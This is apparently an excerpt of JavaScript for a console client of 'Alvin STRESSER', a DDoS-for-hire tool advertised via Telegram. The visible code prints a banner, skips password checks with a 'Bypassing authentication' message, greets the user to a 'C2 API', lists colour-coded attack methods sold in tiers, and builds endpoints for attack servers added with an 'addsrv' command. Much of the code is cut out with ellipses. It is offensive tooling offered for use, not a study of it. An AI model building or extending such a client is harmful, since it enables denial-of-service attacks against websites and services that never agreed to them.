...
console.clear()
console.log(`
[ SYSTEM ] Welcome To Alvin STRESSER
[ SYSTEM ] Owner Tools: t.me/@AlvinXGun_2021

    ___    __      _      _____ __                                
   /   |  / /   __(_)___ / ___// /_________  _____________  _____
  / /| | / / | / / / __ \\\\__ \\/ __/ ___/ _ \\/ ___/ ___/ _ \\/ ___/
 / ___ |/ /| |/ / / / / /__/ / /_/ /  /  __(__  |__  )  __/ /    
/_/  |_/_/ |___/_/_/ /_/____/\\__/_/   \\___/____/____/\\___/_/     
...
| AlvinXGun_2021 TOOLS 2026 - 2027
| Telegram : t.me/AlvinXGun_2021

Please type "help" to show all menu
...
async function bootup() {
  try {
    ...
    // Langsung lanjut tanpa minta password
    console.clear()
    console.log(`\x1b[0mBypassing authentication...`)
    await sleep(1000)
    console.clear()
    console.log(`[ \x1b[1m\x1b[32mWelcome To AlvinXGun_2021 tools C2 API  ${version}\x1b[0m ]`)
    await sleep(1000)
    await banner()
    sigma()
...
function methods() {
    ...
    methodsData.forEach(m=>{
        ...
        const desc = (m.description||'').padEnd(35);
        let color="\x1b[37m";
        if(desc.includes("[BASIC]")) color="\x1b[33m";
        if(desc.includes("[VIP]")) color="\x1b[32m";
        if(desc.includes("[PRO]")) color="\x1b[31m";
        if(desc.includes("[PRIVATE]")) color="\x1b[35m";
        console.log(color+name+" "+desc+"\x1b[0m");
    });
}
...
addsrv http://1.1.1.1:2000/Sutrator`);
    sigma();
	return
  }
    try {
        ...
        const endpoint = 'http://' + hostt + '/Sutrator';
